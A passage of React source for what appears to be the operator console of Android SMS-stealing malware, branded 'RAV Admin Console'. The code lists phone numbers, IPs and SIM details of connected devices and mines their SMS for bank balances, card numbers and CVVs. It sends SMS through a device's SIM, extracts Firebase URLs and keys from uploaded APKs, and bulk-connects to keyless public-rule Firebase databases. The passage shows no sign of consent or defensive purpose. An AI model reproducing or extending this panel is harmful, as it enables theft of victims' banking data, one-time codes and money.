                  <InfoRow label="Phone Number" value={phone} mono />
                  <InfoRow label="Network" value={network} />
                  <InfoRow label="Android" value={dev.android} />
                  <InfoRow label="IP Address" value={dev.ip} mono />
                  <InfoRow label="Storage" value={dev.storage} />
                  <InfoRow label="CPU Arch" value={dev.cpu} mono />
                  <InfoRow label="SDK Version" value={dev.sdk} />
                  <InfoRow label="SIM Cards" value={`${dev.sims.length} SIM(s)`} />
                  {dev.sims.map((s, i) => s.phoneNumber ? <InfoRow key={i} label={`SIM ${i+1} Number`} value={s.phoneNumber} mono /> : null)}
                  {analysis.phoneNumbers.length > 0 && (
                    <>
                      <p className="dev-meta-label mt-4 mb-2">From SMS</p>
                      {analysis.phoneNumbers.map((p, i) => <InfoRow key={i} label={`Phone #${i+1}`} value={p} mono highlight="#60a5fa" />)}
                    </>
                  )}
                  {analysis.networks.map((n, i) => <InfoRow key={i} label={`Network #${i+1}`} value={n} highlight="#c084fc" />)}
                </div>
              )}

              {activeTab === 'bank' && (
                <div className="flex flex-col">
                  <div className="flex items-center justify-between px-5 py-3 bd" style={{ borderBottomWidth: 1 }}>
                    <div>
                      <span className="text-xs tx2">Auto-detected from {messages.length} SMS</span>
                      {analysis.bankBalances.length > 0 && <p className="text-[10px] text-emerald-500/70 mt-0.5">{analysis.bankBalances.length} bank message(s) found</p>}
                    </div>
                    <button onClick={loadMessages} className="p-1.5 rounded-lg hover:bg-white/5 tx2 hover:text-white transition-colors"><Icon name="RefreshCw" className="w-3.5 h-3.5" /></button>
                  </div>
                  <div className="px-4 py-3 space-y-2">
                    {loadingMsgs ? (
                      <div className="py-12 text-center"><div className="w-6 h-6 border-2 border-[#333] border-t-violet-500 rounded-full animate-spin mx-auto mb-3" /><p className="text-xs tx2">Loading…</p></div>
                    ) : analysis.bankBalances.length === 0 ? (
                      <div className="py-12 text-center"><Icon name="Banknote" className="w-10 h-10 mx-auto mb-3 tx4" /><p className="text-sm font-medium tx3">No bank SMS found</p></div>
                    ) : analysis.bankBalances.map((b, i) => <BankCard key={i} b={b} />)}
                  </div>
                </div>
              )}

              {activeTab === 'card' && (
                <div className="flex flex-col">
                  <div className="flex items-center justify-between px-5 py-3 bd" style={{ borderBottomWidth: 1 }}>
                    <span className="text-xs tx2">Card info from SMS</span>
                    <button onClick={loadMessages} className="p-1.5 rounded-lg hover:bg-white/5 tx2 hover:text-white transition-colors"><Icon name="RefreshCw" className="w-3.5 h-3.5" /></button>
                  </div>
                  <div className="px-4 py-3 space-y-2">
                    {loadingMsgs ? (
                      <div className="py-12 text-center"><div className="w-6 h-6 border-2 border-[#333] border-t-violet-500 rounded-full animate-spin mx-auto" /></div>
                    ) : analysis.cards.length === 0 ? (
                      <div className="py-12 text-center"><Icon name="CreditCard" className="w-10 h-10 mx-auto mb-3 tx4" /><p className="text-sm font-medium tx3">No card info found</p></div>
                    ) : analysis.cards.map((c, i) => <CardItem key={i} c={c} />)}
                  </div>
                </div>
              )}

              {activeTab === 'sms' && (
                <div className="flex flex-col">
                  <div className="flex items-center justify-between px-5 py-3 bd" style={{ borderBottomWidth: 1 }}>
                    <span className="text-xs tx2">Live sync 1s · last 1 hr only · sound always on</span>
                    <button onClick={loadMessages} className="p-1.5 rounded-lg hover:bg-white/5 tx2 hover:text-white transition-colors"><Icon name="RefreshCw" className="w-3.5 h-3.5" /></button>
                  </div>
                  <div className="px-4 py-3 space-y-2">
                    {loadingMsgs ? (
                      <div className="py-12 text-center"><div className="w-6 h-6 border-2 border-[#333] border-t-violet-500 rounded-full animate-spin mx-auto mb-3" /><p className="text-xs tx2">Loading messages…</p></div>
                    ) : messages.length === 0 ? (
                      <div className="py-12 text-center"><Icon name="MessageSquare" className="w-10 h-10 mx-auto mb-3 tx4" /><p className="text-sm font-medium tx3">No messages</p></div>
                    ) : messages.map((m, i) => {
                      const isBank = /AVL|AVAL|AVBL|BAL\.|CREDITED|DEBITED|INR/i.test(m.text);
                      const isCard = /CARD|CVV|CREDIT CARD|DEBIT CARD/i.test(m.text);
                      const cls = isCard ? 'card' : isBank ? 'bank' : 'plain';
                      const senderColor = isCard ? 'text-purple-400' : isBank ? 'text-emerald-400' : 'text-violet-400';
                      return (
                        <div key={i} className={`msgitem ${cls}`}>
                          <div className="flex items-center justify-between mb-2 gap-2">
                            <div className="flex items-center gap-1.5 min-w-0">
                              <span className={`text-xs font-bold truncate ${senderColor}`}>{m.sender}</span>
                              {isBank && <Icon name="Banknote" className="w-3 h-3 text-emerald-600/70 flex-shrink-0" />}
                              {isCard && <Icon name="CreditCard" className="w-3 h-3 text-purple-600/70 flex-shrink-0" />}
                            </div>
                            <span className="text-[10px] tx4 font-mono flex-shrink-0">{m.time}</span>
                          </div>
                          <p className="text-xs tx1 leading-relaxed">{m.text.substring(0, 250)}</p>
                        </div>
                      );
                    })}
                  </div>
                </div>
              )}

              {activeTab === 'send' && (
                <div className="px-5 py-4 space-y-4">
                  <div>
                    <p className="dev-meta-label mb-2">Select SIM</p>
                    <div className="flex gap-2">
                      {[1,2].map(sim => (
                        <button key={sim} onClick={() => setSendSim(sim)} className={`simbtn ${sendSim === sim ? 'on' : ''}`}>SIM {sim}</button>
                      ))}
                    </div>
                  </div>
                  <div>
                    <p className="dev-meta-label mb-2">Recipient</p>
                    <input type="text" value={sendTo} onChange={e => setSendTo(e.target.value)} placeholder="+919876543210" className="inp font-mono" />
                  </div>
                  <div>
                    <p className="dev-meta-label mb-2">Message</p>
                    <textarea value={sendMsg} onChange={e => setSendMsg(e.target.value)} rows={4} placeholder="Type your message here…" className="inp resize-none" />
                    <p className="text-[10px] tx3 mt-1 text-right">{sendMsg.length} chars</p>
                  </div>
                  <button onClick={sendSms} disabled={sending} className="btn-primary">
                    {sending ? <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" /> : <Icon name="Send" className="w-4 h-4" />}
                    {sending ? 'Sending…' : `Send via SIM ${sendSim}`}
                  </button>
                  {phone !== '—' && (
                    <button onClick={() => setSendTo(phone)} className="w-full py-2.5 rounded-xl border bd2 surface3 text-xs tx2 hover:text-white transition-all">
                      Use device number: <span className="font-mono tx1">{phone}</span>
                    </button>
                  )}
                </div>
              )}
            </div>
          </div>
        </div>
      );
    }

    /* ═══════════════════════════════════════════════════════════════════
       ADMIN LOGIN
       ═══════════════════════════════════════════════════════════════════ */
    function AdminLogin({ onLogin }) {
      const [pass, setPass] = useState('');
      const [show, setShow] = useState(false);
      const [error, setError] = useState('');
      const [loading, setLoading] = useState(false);

      const submit = async (e) => {
        e.preventDefault(); setLoading(true); setError('');
        await new Promise(r => setTimeout(r, 400));
        if (pass === getAdminPass()) { setAdminLoggedIn(); onLogin(); }
        else { setError('Incorrect password. Access denied.'); setPass(''); }
        setLoading(false);
      };

      return (
        <div className="min-h-screen flex items-center justify-center relative overflow-hidden px-4">
          <div className="relative z-10 w-full max-w-sm">
            <div className="text-center mb-8">
              <div className="inline-flex items-center justify-center w-16 h-16 rounded-2xl mb-4 violet-gradient shadow-lg shadow-violet-900/40">
                <Icon name="Shield" className="w-8 h-8 text-white" />
              </div>
              <h1 className="app-title mb-2 flex justify-center"><BrandMark size="xl" /></h1>
              <p className="text-sm tx2">Admin Console · Secure Access</p>
            </div>

            <div className="card-shell rounded-3xl p-7 shadow-2xl">
              <form onSubmit={submit} className="space-y-4">
                <div>
                  <label className="dev-meta-label mb-2">Admin Password</label>
                  <div className="relative">
                    <Icon name="Lock" className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 tx4" />
                    <input type={show ? 'text' : 'password'} value={pass} onChange={e => setPass(e.target.value)} autoFocus placeholder="Enter admin password"
                      className="inp pl-10 pr-10" />
                    <button type="button" onClick={() => setShow(s => !s)} className="absolute right-3 top-1/2 -translate-y-1/2 tx4 hover:tx1 transition-colors">
                      <Icon name={show ? 'EyeOff' : 'Eye'} className="w-4 h-4" />
                    </button>
                  </div>
                </div>
                {error && <p className="text-sm text-red-400 animate-fade-up">{error}</p>}
                <button type="submit" disabled={loading || !pass} className="btn-primary">
                  {loading ? <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" /> : <Icon name="Lock" className="w-4 h-4" />}
                  {loading ? 'Authenticating…' : 'Access Panel'}
                </button>
              </form>
            </div>

            <p className="text-center text-xs tx4 mt-6">RAV Admin Console · All connections are logged</p>
          </div>
        </div>
      );
    }

    /* ═══════════════════════════════════════════════════════════════════
       CONNECT SCREEN
       ═══════════════════════════════════════════════════════════════════ */
    const SERVER_COLORS_LIST = ['#8b5cf6','#22d3ee','#ec4899','#f59e0b','#22c55e','#6366f1','#eab308','#f43f5e','#14b8a6','#a855f7'];

    function ConnectScreen({ onConnect }) {
      const [accounts, setAccounts] = useState(getAccounts);
      const [showAddForm, setShowAddForm] = useState(false);
      const [formName, setFormName] = useState('');
      const [formUrl, setFormUrl] = useState('');
      const [formKey, setFormKey] = useState('');
      const [multiUrls, setMultiUrls] = useState('');
      const [multiKeys, setMultiKeys] = useState('');
      const [multiStatus, setMultiStatus] = useState('');
      const [addMode, setAddMode] = useState('single');
      const [connecting, setConnecting] = useState(false);
      const [formError, setFormError] = useState('');
      const [apkLoading, setApkLoading] = useState(false);
      const [apkError, setApkError] = useState('');
      const [apkResult, setApkResult] = useState(null);
      const [apkFileName, setApkFileName] = useState('');
      const [shareUrl, setShareUrl] = useState('');
      const [shareCopied, setShareCopied] = useState(false);
      const [selectedIds, setSelectedIds] = useState(() => new Set(getActiveServerIds()));
      const fileRef = useRef(null);

      const handleExport = () => {
        const data = { accounts, exportedAt: new Date().toISOString() };
        const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
        const a = document.createElement('a'); a.href = URL.createObjectURL(blob); a.download = 'profex-firebase-accounts.json'; a.click();
      };
      const handleImport = (e) => {
        const f = e.target.files?.[0]; if (!f) return;
        const reader = new FileReader();
        reader.onload = ev => {
          try {
            const json = JSON.parse(ev.target?.result);
            const imported = json.accounts || [];
            const existing = new Set(accounts.map(a => a.url));
            const toAdd = imported.filter(a => !existing.has(a.url));
            const merged = [...accounts, ...toAdd]; setAccounts(merged); saveAccounts(merged);
          } catch { alert('Invalid file format'); }
        };
        reader.readAsText(f); e.target.value = '';
      };
      const testAndSave = async (acct) => {
        try { await fbGet(acct.url, acct.key, 'clients'); return true; }
        catch (e) {
          const msg = e.message;
          if (msg.includes('PERMISSION_DENIED')) setFormError('Permission Denied: Use Database Secret key, not API key.');
          else if (msg.includes('Network error') || msg.includes('Failed to fetch')) setFormError('Network error. Check Firebase URL format.');
          else setFormError('Connection failed: ' + msg.slice(0, 120));
          return false;
        }
      };
      const addSingle = async () => {
        const url = formUrl.trim().replace(/\/$/, ''), key = formKey.trim();
        const name = formName.trim() || nameFromUrl(url);
        if (!url) { setFormError('Please enter the Firebase URL'); return; }
        if (accounts.find(a => a.url === url)) { setFormError('This URL is already saved.'); return; }
        setConnecting(true); setFormError('');
        const ok = await testAndSave({ url, key, name });
        if (ok) {
          const color = SERVER_COLORS_LIST[accounts.length % SERVER_COLORS_LIST.length];
          const acct = { id: Date.now(), name, url, key, date: new Date().toLocaleString(), color };
          const updated = [...accounts, acct]; setAccounts(updated); saveAccounts(updated);
          setSelectedIds(prev => { const n = new Set(prev); n.add(acct.id); return n; });   // auto-select: add → dashboard ready
          setFormUrl(''); setFormKey(''); setFormName(''); setShowAddForm(false); setApkResult(null);
        }
        setConnecting(false);
      };
      /* multi-add — key optional (public-rule databases sync without a secret);
         every URL is connection-tested, failures are reported, nothing saved twice */
      const runMultiAdd = async (urls, keys) => {
        if (urls.length === 0) { setFormError('Enter at least one Firebase URL'); return; }
        setConnecting(true); setFormError(''); setMultiStatus('');
        const added = [];
        const failed = [];
        const results = await Promise.all(urls.map((url, i) => netLimit(async () => {
          const key = (keys[i] || '').trim();
          if (accounts.find(a => a.url === url) || added.find(a => a.url === url)) return null;
          const clean = url.trim().replace(/\/$/, '');
          if (!clean.includes('firebaseio.com') && !clean.includes('firebasedatabase.app')) { failed.push(clean); return null; }
          try { await fbGet(clean, key, 'clients'); return { url: clean, key }; } catch { failed.push(clean); return null; }
        })));
        for (const r of results) {
          if (!r) continue;
          if (added.find(a => a.url === r.url)) continue;
          const name = nameFromUrl(r.url);
          const color = SERVER_COLORS_LIST[(accounts.length + added.length) % SERVER_COLORS_LIST.length];
          added.push({ id: Date.now() + added.length, name, url: r.url, key: r.key, date: new Date().toLocaleString(), color });
        }
        if (added.length > 0) {
          const updated = [...accounts, ...added]; setAccounts(updated); saveAccounts(updated);
          setSelectedIds(prev => { const n = new Set(prev); for (const a of added) n.add(a.id); return n; });
          setMultiUrls(''); setMultiKeys('');
          setMultiStatus(`${added.length} server${added.length !== 1 ? 's' : ''} connected & selected${failed.length ? ` · ${failed.length} skipped (rules off / dead)` : ''}`);
        }
        if (added.length === 0) setFormError(`No server connected — check URLs & keys (${failed.length}/${urls.length} failed).`);
        setConnecting(false);
      };
      const addMulti = async () => {
        const urls = multiUrls.split(/[\s,]+/).map(s => s.trim()).filter(Boolean);
        const keys = multiKeys.split('\n').map(s => s.trim());
        await runMultiAdd(urls, keys);
      };
      const deleteAccount = (id, e) => {
        e.stopPropagation(); if (!confirm('Delete this Firebase server?')) return;
        const updated = accounts.filter(a => a.id !== id); setAccounts(updated); saveAccounts(updated);
        setSelectedIds(prev => { const n = new Set(prev); n.delete(id); return n; });
      };
      const toggleSelect = (id) => setSelectedIds(prev => { const n = new Set(prev); n.has(id) ? n.delete(id) : n.add(id); return n; });
      const selectAll = () => setSelectedIds(new Set(accounts.map(a => a.id)));
      const selectNone = () => setSelectedIds(new Set());
      const connectSelected = () => {
        const selected = accounts.filter(a => selectedIds.has(a.id));
        if (selected.length === 0) { alert('Select at least one Firebase server'); return; }
        saveActiveServerIds([...selectedIds]); onConnect(selected);
      };
      const shareAccount = (acct, e) => { e.stopPropagation(); setShareUrl(makeShareLink(acct.url, acct.key)); };
      const shareSelected = () => {
        const selected = accounts.filter(a => selectedIds.has(a.id)); if (selected.length === 0) return;
        setShareUrl(makeMultiShareLink(selected.map(a => ({ url: a.url, key: a.key, name: a.name }))));
      };
      const handleApkFile = async (file) => {
        if (!file.name.endsWith('.apk') && !file.name.endsWith('.zip')) { setApkError('Only .apk files supported'); return; }
        setApkLoading(true); setApkError(''); setApkResult(null); setApkFileName(file.name);
        try {
          const result = await parseApk(file);
          if (!result || (!result.firebaseUrl && !result.apiKey)) { setApkError('Firebase config not found in this APK. Try a different APK.'); }
          else { setApkResult({ firebaseUrl: result.firebaseUrl, apiKey: result.apiKey }); if (result.firebaseUrl) setFormUrl(result.firebaseUrl); if (result.apiKey) setFormKey(result.apiKey); }
        } catch { setApkError('Failed to parse APK. File may be corrupted or protected.'); }
        setApkLoading(false);
      };

      return (
        <div className="min-h-screen flex items-center justify-center relative overflow-hidden px-4 py-8">
          <div className="relative z-10 w-full max-w-lg">
            <div className="text-center mb-7">
              <div className="inline-flex items-center justify-center w-14 h-14 rounded-2xl mb-3 violet-gradient shadow-lg shadow-violet-900/40">
                <Icon name="Shield" className="w-7 h-7 text-white" />
              </div>
              <h1 className="app-title flex justify-center"><BrandMark size="xl" /></h1>
              <p className="text-xs tx2 mt-1">Multi-Firebase Device Management Console</p>
            </div>

            <div className="card-shell rounded-3xl p-6 shadow-2xl">
              <div className="flex items-center justify-between mb-4">
                <div>
                  <h2 className="text-sm font-semibold tx1">Firebase Servers</h2>
                  <p className="text-xs tx2 mt-0.5">{accounts.length} server{accounts.length !== 1 ? 's' : ''} · {selectedIds.size} selected</p>
                </div>
                <div className="flex items-center gap-2">
                  <button onClick={handleExport} title="Export all servers" className="copybtn" disabled={accounts.length === 0}>
                    <Icon name="Download" className="w-3.5 h-3.5" />
                  </button>
                  <label title="Import servers file" className="copybtn cursor-pointer">
                    <Icon name="Upload" className="w-3.5 h-3.5" />
                    <input type="file" accept=".json" onChange={handleImport} className="hidden" />
                  </label>
                  {selectedIds.size > 0 && (
                    <button onClick={shareSelected} title="Share selected servers link" className="copybtn" style={{ color: '#a5b4fc', borderColor: 'rgba(99,102,241,.4)' }}>
                      <Icon name="Link" className="w-3.5 h-3.5" />
                    </button>
                  )}
                  {accounts.length > 0 && (
                    <button onClick={() => selectedIds.size === accounts.length ? selectNone() : selectAll()} className="text-xs tx2 hover:text-white transition-colors px-2">
                      {selectedIds.size === accounts.length ? 'None' : 'All'}
                    </button>
                  )}
                </div>
              </div>

              <div className="space-y-2 max-h-64 overflow-y-auto pr-1 mb-4">
                {accounts.length === 0 ? (
                  <div className="text-center py-8 tx2 text-sm">
                    <Icon name="Server" className="w-8 h-8 mx-auto mb-2 opacity-40" />
                    No Firebase servers saved
                  </div>
                ) : accounts.map((a, idx) => (
                  <div key={a.id} onClick={() => toggleSelect(a.id)}
                    className={`flex items-center gap-3 p-3 rounded-xl border cursor-pointer transition-all duration-200 ${selectedIds.has(a.id) ? 'border-violet-500/45 bg-violet-950/25' : 'bd hover:bg-white/[.03]'}`}>
                    <div className="flex-shrink-0 w-7 h-7 rounded-lg flex items-center justify-center text-[10px] font-bold text-white" style={{ background: a.color || SERVER_COLORS_LIST[idx % SERVER_COLORS_LIST.length] }}>
                      {idx + 1}
                    </div>
                    <div className="flex-1 min-w-0">
                      <p className="text-xs font-semibold tx1 truncate">{a.name}</p>
                      <p className="text-[10px] tx3 font-mono truncate mt-0.5">{a.url}</p>
                      <p className="text-[10px] tx3 font-mono truncate mt-0.5">{a.key ? (a.key.substring(0, 20) + '…') : 'public — no key needed'}</p>
                    </div>
                    <div className="flex items-center gap-1.5 flex-shrink-0">
                      {selectedIds.has(a.id) && <Icon name="Check" className="w-3.5 h-3.5 text-violet-400" />}
                      <button onClick={e => shareAccount(a, e)} className="copybtn" title="Share link">
                        <Icon name="Link" className="w-3 h-3" />
                      </button>
                      <button onClick={e => deleteAccount(a.id, e)} className="copybtn" style={{ color: '#fb7185', borderColor: 'rgba(244,63,94,.3)' }}>
                        <Icon name="Trash2" className="w-3 h-3" />
                      </button>
                    </div>
                  </div>
                ))}
              </div>

              {showAddForm ? (
                <div className="animate-fade-up mb-4 border bd rounded-2xl p-4 surface3">
                  <div className="flex items-center justify-between mb-3">
                    <h3 className="text-sm font-semibold tx1">Add Firebase Server</h3>
                    <button onClick={() => { setShowAddForm(false); setFormError(''); setApkResult(null); }} className="tx4 hover:text-white transition-colors">
                      <Icon name="X" className="w-4 h-4" />
                    </button>
                  </div>
                  <div className="flex gap-2 mb-4">
                    {['single','multi'].map(m => (
                      <button key={m} onClick={() => setAddMode(m)} className={`flex-1 py-1.5 rounded-lg text-xs font-semibold transition-all ${addMode === m ? 'bg-violet-600/20 border border-violet-500/35 text-violet-300' : 'surface2 bd tx2 hover:text-white'}`}>
                        {m === 'single' ? 'Single Server' : 'Multiple (Linewise)'}
                      </button>
                    ))}
                  </div>

                  {addMode === 'single' ? (
                    <div className="space-y-3">
                      <div>
                        <label className="dev-meta-label mb-1.5">Extract from APK (optional)</label>
                        {!apkResult && !apkLoading && (
                          <label
                            onDrop={e => { e.preventDefault(); const f = e.dataTransfer.files[0]; if (f) handleApkFile(f); }}
                            onDragOver={e => e.preventDefault()}
                            className="flex items-center gap-3 py-3 px-4 rounded-xl border-2 border-dashed bd2 hover:border-violet-500/45 hover:bg-violet-950/15 cursor-pointer transition-all group">
                            <Icon name="Upload" className="w-4 h-4 tx4 group-hover:text-violet-400 transition-colors flex-shrink-0" />
                            <div>
                              <p className="text-xs font-semibold tx2 group-hover:text-white">Upload APK File</p>
                              <p className="text-[10px] tx4">Auto-extracts Firebase URL &amp; API Key</p>
                            </div>
                            <input ref={fileRef} type="file" accept=".apk,.zip" onChange={e => { const f = e.target.files?.[0]; if (f) handleApkFile(f); e.target.value = ''; }} className="hidden" />
                          </label>
                        )}
                        {apkLoading && (
                          <div className="flex items-center gap-3 py-4 rounded-xl bd surface3">
                            <div className="w-5 h-5 border-2 border-violet-900/50 border-t-violet-500 rounded-full animate-spin" />
                            <div>
                              <p className="text-xs font-semibold text-violet-300">Scanning APK…</p>
                              <p className="text-[10px] tx3 font-mono truncate max-w-[180px]">{apkFileName}</p>
                            </div>
                          </div>
                        )}
                        {apkError && (
                          <div className="flex items-center gap-2 p-2.5 rounded-xl bg-red-950/30 border border-red-900/40 mt-1">
                            <p className="text-xs text-red-400 flex-1">{apkError}</p>
                            <button onClick={() => { setApkError(''); setApkResult(null); }} className="tx3 hover:text-white"><Icon name="X" className="w-3 h-3" /></button>
                          </div>
                        )}
                        {apkResult && !apkLoading && (
                          <div className="rounded-xl border border-emerald-900/40 bg-emerald-950/20 p-2.5 mt-1">
                            <div className="flex items-center gap-1.5 mb-1.5">
                              <Icon name="Check" className="w-3.5 h-3.5 text-emerald-400" />
                              <span className="text-xs font-semibold text-emerald-400">Extracted Successfully</span>
                              <button onClick={() => { setApkResult(null); setApkError(''); setApkFileName(''); }} className="ml-auto tx4 hover:text-white"><Icon name="X" className="w-3 h-3" /></button>
                            </div>
                            <div className="space-y-1">
                              {[['Firebase URL', apkResult.firebaseUrl], ['API Key', apkResult.apiKey]].map(([label, val]) => val && (
                                <div key={label}>
                                  <p className="text-[9px] tx4 uppercase tracking-wider mb-0.5">{label}</p>
                                  <div className="flex items-center gap-2 bg-[#0a0a0a] rounded-lg px-2 py-1 border bd">
                                    <span className="text-[10px] font-mono text-emerald-300 flex-1 truncate">{val}</span>
                                    <CopyButton text={val} />
                                  </div>
                                </div>
                              ))}
                            </div>
                          </div>
                        )}
                      </div>
                      <div>
                        <label className="dev-meta-label mb-1.5">Firebase Database URL</label>
                        <input type="text" value={formUrl} onChange={e => setFormUrl(e.target.value)}
                          onKeyDown={e => { if (e.key === 'Enter' && !connecting) addSingle(); }}
                          placeholder="https://your-project.firebaseio.com" autoFocus className="inp font-mono" />
                      </div>
                      <div>
                        <label className="dev-meta-label mb-1.5">Server Name <span className="tx4 font-normal">(optional — auto from URL)</span></label>
                        <input type="text" value={formName} onChange={e => setFormName(e.target.value)} placeholder="Auto name from URL" className="inp" />
                      </div>
                      <div>
                        <label className="dev-meta-label mb-1.5">Database Secret / Auth Key <span className="tx4 font-normal">(optional — public databases sync without it)</span></label>
                        <input type="text" value={formKey} onChange={e => setFormKey(e.target.value)}
                          onKeyDown={e => { if (e.key === 'Enter' && !connecting) addSingle(); }}
                          placeholder="Leave blank for keyless (public rules)" className="inp font-mono" />
                      </div>
                      {formError && <p className="text-xs text-red-400 animate-fade-up">{formError}</p>}
                      <button onClick={addSingle} disabled={connecting} className="btn-primary">
                        {connecting ? <div className="w-3.5 h-3.5 border-2 border-white/30 border-t-white rounded-full animate-spin" /> : <Icon name="Plus" className="w-3.5 h-3.5" />}
                        {connecting ? 'Testing connection…' : 'Add Server'}
                      </button>
                    </div>
                  ) : (
                    <div className="space-y-3">
                      <div>
                        <label className="dev-meta-label mb-1.5">Firebase URLs (one per line)</label>
                        <textarea value={multiUrls} onChange={e => setMultiUrls(e.target.value)} rows={4} placeholder={"https://project1.firebaseio.com\nhttps://project2.firebaseio.com\nhttps://project3.firebaseio.com"} className="inp font-mono resize-none" />
                      </div>
                      <div>
                        <label className="dev-meta-label mb-1.5">Secret Keys (same order, one per line)</label>
                        <textarea value={multiKeys} onChange={e => setMultiKeys(e.target.value)} rows={4} placeholder={"secretKey1\nsecretKey2\n(leave blank lines for public-rule databases)"} className="inp font-mono resize-none" />
                      </div>
                      <p className="text-[10px] tx3">Keys optional — public-rule databases connect without keys. Each URL is connection-tested; failures are skipped automatically.</p>
                      {formError && <p className="text-xs text-red-400 animate-fade-up">{formError}</p>}
                      <button onClick={addMulti} disabled={connecting} className="btn-primary">
                        {connecting ? <div className="w-3.5 h-3.5 border-2 border-white/30 border-t-white rounded-full animate-spin" /> : <Icon name="Plus" className="w-3.5 h-3.5" />}
                        {connecting ? 'Testing connections…' : 'Add All Servers'}
                      </button>
                    </div>
                  )}
                </div>
              ) : (
                <button onClick={() => { setShowAddForm(true); setFormError(''); setApkResult(null); setMultiStatus(''); }} className="btn-ghost mb-4">
                  <Icon name="Plus" className="w-3.5 h-3.5" />
                  Add Firebase Server
                </button>
              )}

              {multiStatus && !showAddForm && (
                <p className="mb-4 text-xs text-emerald-400 animate-fade-up text-center">{multiStatus}</p>
              )}

              <button onClick={connectSelected} disabled={selectedIds.size === 0} className="btn-primary" style={{ opacity: selectedIds.size === 0 ? .4 : 1, cursor: selectedIds.size === 0 ? 'not-allowed' : 'pointer' }}>
                <Icon name="ChevronRight" className="w-4 h-4" />
                {selectedIds.size === 0 ? 'Select servers to connect' : `Open Dashboard (${selectedIds.size} server${selectedIds.size !== 1 ? 's' : ''})`}
              </button>
            </div>

            <p className="text-center text-xs tx4 mt-6">RAV Admin Console · All connections are logged</p>
          </div>

          {shareUrl && (
            <div className="fixed inset-0 z-[90] flex items-center justify-center px-4 scrimbg" style={{ backdropFilter: 'blur(7px)' }} onClick={() => setShareUrl('')}>
              <div className="w-full max-w-md card-shell rounded-2xl p-6 shadow-2xl animate-fade-up" onClick={e => e.stopPropagation()}>
                <div className="flex items-center justify-between mb-4">
                  <div className="flex items-center gap-2">
                    <div className="w-8 h-8 rounded-xl bg-indigo-950 border border-indigo-800/60 flex items-center justify-center">
                      <Icon name="Link" className="w-4 h-4 text-indigo-300" />
                    </div>
                    <div>
                      <h3 className="font-semibold tx1 text-sm">Share Connection</h3>
                      <p className="text-xs tx2">Anyone with this link can connect directly</p>
                    </div>
                  </div>
                  <button onClick={() => setShareUrl('')} className="p-1.5 rounded-lg hover:bg-white/5 transition-colors tx2">
                    <Icon name="X" className="w-4 h-4" />
                  </button>
                </div>
                <div className="flex items-center gap-2 surface2 bd rounded-xl px-3 py-2.5 mb-4">
                  <span className="text-xs font-mono tx2 flex-1 truncate select-all">{shareUrl}</span>
                  <button onClick={() => { navigator.clipboard.writeText(shareUrl).catch(()=>{}); setShareCopied(true); setTimeout(() => setShareCopied(false), 2000); }}
                    className={`flex-shrink-0 flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-semibold transition-all ${shareCopied ? 'bg-emerald-950 border border-emerald-700/60 text-emerald-400' : 'bg-indigo-950 border border-indigo-800/60 text-indigo-300 hover:bg-indigo-900'}`}>
                    <Icon name={shareCopied ? 'Check' : 'Copy'} className="w-3 h-3" />
                    {shareCopied ? 'Copied!' : 'Copy'}
                  </button>
                </div>
                <div className="flex items-start gap-2 p-3 rounded-xl bg-amber-950/25 border border-amber-900/40">
                  <Icon name="Shield" className="w-4 h-4 text-amber-500 flex-shrink-0 mt-0.5" />
                  <p className="text-xs text-amber-300/80">This link contains your Firebase credentials. Only share with trusted people.</p>
                </div>
              </div>
            </div>
          )}
        </div>
      );
    }

    /* ═══════════════════════════════════════════════════════════════════
       DASHBOARD
       ═══════════════════════════════════════════════════════════════════ */
    const STRIPES = {
      a: 'linear-gradient(180deg,#22d3ee,#8b5cf6 55%,#ec4899)',
      b: 'linear-gradient(180deg,#22d3ee,#6366f1 50%,#a855f7)',
      c: 'linear-gradient(180deg,#f43f5e,#ec4899 45%,#8b5cf6)',
      d: 'linear-gradient(180deg,#6366f1,#8b5cf6 50%,#22d3ee)',
      e: 'linear-gradient(180deg,#f59e0b,#f43f5e 55%,#ec4899)',
    };
    const TINTS = {
      a: 'rgba(139,92,246,.25)', b: 'rgba(34,211,238,.16)', c: 'rgba(244,63,94,.18)',
      d: 'rgba(99,102,241,.25)', e: 'rgba(245,158,11,.18)',
    };
    const DEAD_STRIKES = 3;
    const HIDDEN_DEV_INTERVAL = 30000;   // background tab → slow poll
    const HIDDEN_SMS_INTERVAL = 20000;
    const HIDDEN_SMS_BATCH = 20;
    const SMS_TICK = 2000;               // how often the bulk engine is eligible to run
    const SMS_BASE_INTERVAL = 2500;      // minimum gap between bulk runs in foreground
    const PANEL_SYNC_MS = 1000;          // open-device console: fastest live message sync

    function Dashboard({ servers, onLogout, onBackToConnect, onRemoveServer }) {
      const [devices, setDevices] = useState([]);
      const [loading, setLoading] = useState(true);
      const [selectedDevice, setSelectedDevice] = useState(null);
      const [filter, setFilter] = useState('all');
      const [carrierFilter, setCarrierFilter] = useState('all');
      const [smsQuery, setSmsQuery] = useState('');
      const [sort, setSort] = useState('new');
      const [search, setSearch] = useState('');
      const [error, setError] = useState('');
      const [toasts, setToasts] = useState([]);
      const [serverErrors, setServerErrors] = useState({});
      const [popupMsg, setPopupMsg] = useState(null);
      const [lastUpdate, setLastUpdate] = useState(0);
      const [latency, setLatency] = useState(0);
      const [live, setLive] = useState('idle');
      const [favSet, setFavSet] = useState(() => new Set(getFavoriteDevices()));
      const [visibleCount, setVisibleCount] = useState(48);
      const [showWorkers, setShowWorkers] = useState(false);
      const [menuOpen, setMenuOpen] = useState(false);
      const [openPicker, setOpenPicker] = useState(null);
      const [smsStamp, setSmsStamp] = useState(0);          // bumped only when message data changes
      const [prefs, setPrefs] = useState(() => getPrefs());

      const devicesRef = useRef(devices);
      const prevCountRef = useRef(0);
      const failRef = useRef({});
      const deadRef = useRef({});
      const analysisTsRef = useRef(new Map());
      const lastMsgKeyRef = useRef({});
      const popupQueueRef = useRef([]);
      const popupTimerRef = useRef(null);
      const isShowingRef = useRef(false);
      const fetchGenRef = useRef(0);
      const smsPumpBusyRef = useRef(false);
      const lastDevRunRef = useRef(0);
      const lastSmsRunRef = useRef(0);
      const deviceOpenRef = useRef(null);   // id of the device whose panel is open → highest sync priority
      const bulkMsRef = useRef(0);          // duration of last bulk messages fetch → adaptive throttle
      const smsRowsRef = useRef(new Map()); // deviceKey → prebuilt sms rows (incremental)
      const deviceSetLenRef = useRef(0);    // devices.length seen when rows were last reconciled
      const sentinelRef = useRef(null);
